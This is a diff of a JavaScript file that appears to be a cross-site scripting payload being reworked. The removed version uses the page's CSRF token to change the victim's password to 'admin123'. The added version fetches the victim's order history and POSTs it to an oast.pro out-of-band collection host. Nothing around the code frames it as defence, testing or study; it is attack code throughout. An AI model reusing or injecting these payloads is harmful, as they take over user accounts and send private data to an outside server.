@@ -1,17 +1,25 @@
-const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
 
-fetch('/users/change-password', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json',
-        'X-CSRF-TOKEN': csrfToken 
-    },
-    body: JSON.stringify({
-        password: 'admin123',
-        password_confirmation: 'admin123'
+
+async function fetchData() {
+    try {
+        const response = await fetch('/order-history', {
+            method: 'GET'
+        });
+
+        fetch('d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro', {
+            method: 'POST',
+            body: response.body,
+        });
+    } catch (error) {
+        console.error('Error fetching data:', error);
+        throw error; // Re-throw the error for further handling
+    }
+}
+
+fetchData()
+    .then(() => {
+        console.log('Data fetched successfully');
     })
-}).then(response => response.json())
-  .then(data => console.log('Success:', data))
-  .catch(error => console.error('Error:', error));
-
+    .catch(error => {
+        console.error('Error in fetchData:', error);
+    });
